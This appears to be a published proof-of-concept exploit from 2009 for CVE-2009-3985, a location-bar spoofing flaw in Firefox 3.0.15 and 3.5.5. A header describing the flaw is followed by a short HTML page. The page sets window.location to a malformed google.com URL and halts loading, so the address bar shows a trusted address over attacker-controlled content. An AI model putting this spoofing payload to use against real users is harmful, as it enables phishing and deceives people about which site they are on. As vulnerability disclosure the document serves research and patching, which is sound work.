# Date: 2009-12-18
# Author: Jordi Chancel
# Software Link: http://www.mozilla.org/security/announce/2009/mfsa2009-69.html
# Version: Mozilla Firefox 3.0.15 & 3.5.5
# Tested on: Windows XP-VISTA-SEVEN & LINUX BACKTRACK
# CVE : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3985
# DESCRIPTION: {
#		Security researcher Jordi Chancel reported an issue similar to one fixed in mfsa2009-44
#		in which a web page can set document.location to a URL that can't be displayed properly and then inject
#		content into the resulting blank page. An attacker could use this vulnerability to place a legitimate-looking
#		but invalid URL in the location bar and inject HTML and JavaScript into the body of the
#		page, resulting in a spoofing attack.  }
# Code :
<html>
<title>FAKE PAGE</title>
<body onload="javascript:window.location = 'https://www.google.com%20';window.stop();void(0);">
<h1>FAKE PAGE</h1>
</body>
</html>
